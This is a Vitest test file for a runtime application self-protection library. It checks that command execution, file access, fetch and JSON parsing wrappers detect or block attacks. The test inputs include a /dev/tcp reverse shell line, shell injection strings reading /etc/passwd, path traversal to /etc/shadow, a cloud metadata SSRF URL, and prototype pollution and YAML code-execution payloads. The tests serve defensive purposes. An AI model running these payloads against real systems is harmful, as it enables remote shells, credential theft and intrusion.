/**
 * Tests for @santh/agent RASP modules — exec, filesystem, http, deserialization.
 *
 * Tests:
 *   1. Exec RASP — command injection detection + defense actions
 *   2. FS RASP — path traversal detection + directory escape
 *   3. HTTP RASP — SSRF detection with wrapFetch
 *   4. Deser RASP — deserialization attack detection
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { InvariantDB } from './db.js'
import { wrapExec, type ExecRaspConfig } from './rasp/exec.js'
import { wrapFsOperation, type FsRaspConfig } from './rasp/fs.js'
import { wrapFetch, type HttpRaspConfig } from './rasp/http.js'
import { wrapJsonParse, checkDeserInvariants, type DeserRaspConfig } from './rasp/deser.js'

// ── Command Execution RASP ──────────────────────────────────────

describe('Exec RASP', () => {
    let db: InvariantDB

    beforeEach(() => { db = new InvariantDB(':memory:') })
    afterEach(() => { db.close() })

    it('detects shell command separator injection', () => {
        const config: ExecRaspConfig = { mode: 'defend', db }
        const original = ((cmd: string) => cmd) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        expect(() => wrapped('; cat /etc/passwd')).toThrow(/INVARIANT/)
    })

    it('detects command substitution', () => {
        const config: ExecRaspConfig = { mode: 'defend', db }
        const original = ((cmd: string) => cmd) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        expect(() => wrapped('$(whoami)')).toThrow(/INVARIANT/)
    })

    it('detects reverse shell patterns', () => {
        const config: ExecRaspConfig = { mode: 'defend', db }
        const original = ((cmd: string) => cmd) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        expect(() => wrapped('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')).toThrow(/INVARIANT/)
    })

    it('allows safe commands in defend mode', () => {
        const config: ExecRaspConfig = { mode: 'defend', db }
        const original = ((cmd: string) => `result:${cmd}`) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        const result = wrapped('git status')
        expect(result).toBe('result:git status')
    })

    it('monitors but does not block in observe mode', () => {
        const config: ExecRaspConfig = { mode: 'observe', db }
        const original = ((cmd: string) => `ran:${cmd}`) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        const result = wrapped('; cat /etc/passwd')
        expect(result).toContain('ran:')

        const signals = db.getSignals(10)
        expect(signals.length).toBeGreaterThanOrEqual(1)
        expect(signals.every((s: { action: string }) => s.action === 'monitored')).toBe(true)
    })

    it('records findings for violations', () => {
        const config: ExecRaspConfig = { mode: 'observe', db }
        const original = ((cmd: string) => cmd) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        wrapped('; id')
        const findings = db.getFindings({})
        expect(findings.length).toBeGreaterThan(0)
        expect(findings[0].category).toBe('cmdi')
    })

    it('calls onViolation callback', () => {
        let called = false
        const config: ExecRaspConfig = {
            mode: 'observe', db,
            onViolation: () => { called = true },
        }
        const original = ((cmd: string) => cmd) as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        wrapped('; ls -la')
        expect(called).toBe(true)
    })

    it('passes through when no command string', () => {
        const config: ExecRaspConfig = { mode: 'defend', db }
        const original = ((..._args: unknown[]) => 'ok') as (...args: unknown[]) => unknown
        const wrapped = wrapExec(original, config, 'exec')

        // Called with non-string first arg
        expect(wrapped(42)).toBe('ok')
    })
})

// ── Filesystem RASP ─────────────────────────────────────────────

describe('FS RASP', () => {
    let db: InvariantDB

    beforeEach(() => { db = new InvariantDB(':memory:') })
    afterEach(() => { db.close() })

    it('detects path traversal', () => {
        const config: FsRaspConfig = { mode: 'defend', db, allowedRoots: ['/app'] }
        const original = ((path: string) => path) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        expect(() => wrapped('../../../../etc/passwd')).toThrow(/INVARIANT/)
    })

    it('detects null byte injection', () => {
        const config: FsRaspConfig = { mode: 'defend', db, allowedRoots: ['/app'] }
        const original = ((path: string) => path) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        expect(() => wrapped('/app/file.txt\x00.jpg')).toThrow(/INVARIANT/)
    })

    it('detects sensitive file access', () => {
        const config: FsRaspConfig = { mode: 'defend', db, allowedRoots: ['/app'] }
        const original = ((path: string) => path) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        expect(() => wrapped('/etc/shadow')).toThrow(/INVARIANT/)
    })

    it('allows normal paths in defend mode', () => {
        const config: FsRaspConfig = { mode: 'defend', db, allowedRoots: [] }
        const original = ((path: string) => `read:${path}`) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        const result = wrapped('/app/data/config.json')
        expect(result).toBe('read:/app/data/config.json')
    })

    it('monitors but does not block in observe mode', () => {
        const config: FsRaspConfig = { mode: 'observe', db, allowedRoots: ['/app'] }
        const original = ((path: string) => `read:${path}`) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        const result = wrapped('../../../../etc/passwd')
        expect(result).toContain('read:')

        const signals = db.getSignals(10)
        expect(signals.length).toBeGreaterThanOrEqual(1)
    })

    it('records findings for violations', () => {
        const config: FsRaspConfig = { mode: 'observe', db, allowedRoots: ['/app'] }
        const original = ((path: string) => path) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        wrapped('/etc/passwd')
        const findings = db.getFindings({})
        expect(findings.length).toBeGreaterThan(0)
        expect(findings[0].category).toBe('path_traversal')
    })

    it('calls onViolation callback', () => {
        let violation: { path: string } | null = null
        const config: FsRaspConfig = {
            mode: 'observe', db, allowedRoots: ['/app'],
            onViolation: (v) => { violation = v },
        }
        const original = ((path: string) => path) as (...args: unknown[]) => unknown
        const wrapped = wrapFsOperation(original, config, 'readFile')

        wrapped('/etc/passwd')
        expect(violation).not.toBeNull()
        expect(violation!.path).toBe('/etc/passwd')
    })
})

// ── HTTP RASP — Extended ────────────────────────────────────────

describe('HTTP RASP — wrapFetch', () => {
    let db: InvariantDB

    beforeEach(() => { db = new InvariantDB(':memory:') })
    afterEach(() => { db.close() })

    it('blocks SSRF in defend mode', async () => {
        const config: HttpRaspConfig = { mode: 'defend', db }
        const mockFetch = (async () => new Response('ok')) as typeof globalThis.fetch
        const wrapped = wrapFetch(mockFetch, config)

        await expect(wrapped('http://169.254.169.254/latest/meta-data/')).rejects.toThrow(/INVARIANT/)
    })

    it('monitors but allows SSRF in observe mode', async () => {
        const config: HttpRaspConfig = { mode: 'observe', db }
        const mockFetch = (async () => new Response('ok')) as typeof globalThis.fetch
        const wrapped = wrapFetch(mockFetch, config)

        const result = await wrapped('http://127.0.0.1/admin')
        expect(await result.text()).toBe('ok')

        const signals = db.getSignals(10)
        expect(signals.length).toBeGreaterThanOrEqual(1)
    })

    it('allows external URLs through', async () => {
        const config: HttpRaspConfig = { mode: 'defend', db }
        const mockFetch = (async () => new Response('ok')) as typeof globalThis.fetch
        const wrapped = wrapFetch(mockFetch, config)

        const result = await wrapped('https://api.stripe.com/v1/charges')
        expect(await result.text()).toBe('ok')
    })

    it('calls onViolation callback', async () => {
        let called = false
        const config: HttpRaspConfig = {
            mode: 'observe', db,
            onViolation: () => { called = true },
        }
        const mockFetch = (async () => new Response('ok')) as typeof globalThis.fetch
        const wrapped = wrapFetch(mockFetch, config)

        await wrapped('http://10.0.0.1/internal')
        expect(called).toBe(true)
    })
})

// ── Deserialization RASP ─────────────────────────────────────────

describe('Deser RASP', () => {
    let db: InvariantDB

    beforeEach(() => { db = new InvariantDB(':memory:') })
    afterEach(() => { db.close() })

    it('detects Java serialization magic bytes', () => {
        const config: DeserRaspConfig = { mode: 'defend', db }
        const wrapped = wrapJsonParse(JSON.parse, config)

        // rO0ABXNy is base64 for Java serialized object
        expect(() => wrapped('{"data":"rO0ABXNy"}')).toThrow(/INVARIANT/)
    })

    it('detects PHP object injection', () => {
        const violations = checkDeserInvariants('O:4:"test":1:{s:1:"a";s:1:"b";}')
        expect(violations.some(v => v.id === 'deser_php_object')).toBe(true)
    })

    it('detects prototype pollution in JSON', () => {
        const config: DeserRaspConfig = { mode: 'defend', db }
        const wrapped = wrapJsonParse(JSON.parse, config)

        expect(() => wrapped('{"__proto__":{"admin":true}}')).toThrow(/INVARIANT/)
    })

    it('sanitizes prototype pollution keys in sanitize mode', () => {
        const config: DeserRaspConfig = { mode: 'sanitize', db }
        const wrapped = wrapJsonParse(JSON.parse, config)

        const result = wrapped('{"__proto__":{"admin":true},"name":"test"}') as Record<string, unknown>
        expect(result).toHaveProperty('name', 'test')
        expect(result).not.toHaveProperty('__proto__')
    })

    it('detects YAML code execution tags', () => {
        const violations = checkDeserInvariants('!!python/object:os.system ["id"]')
        expect(violations.some(v => v.id === 'deser_yaml_code_exec')).toBe(true)
    })

    it('allows clean JSON through', () => {
        const config: DeserRaspConfig = { mode: 'defend', db }
        const wrapped = wrapJsonParse(JSON.parse, config)

        const result = wrapped('{"name":"test","count":42}') as Record<string, unknown>
        expect(result).toEqual({ name: 'test', count: 42 })
    })

    it('monitors but does not block in observe mode', () => {
        const config: DeserRaspConfig = { mode: 'observe', db }
        const wrapped = wrapJsonParse(JSON.parse, config)

        const result = wrapped('{"__proto__":{"admin":true}}') as Record<string, unknown>
        expect(result).toBeDefined()

        const signals = db.getSignals(10)
        expect(signals.length).toBeGreaterThanOrEqual(1)
    })

    it('returns violations for raw input', () => {
        const violations = checkDeserInvariants('aced0005')
        expect(violations.some(v => v.id === 'deser_java_gadget')).toBe(true)
    })
})
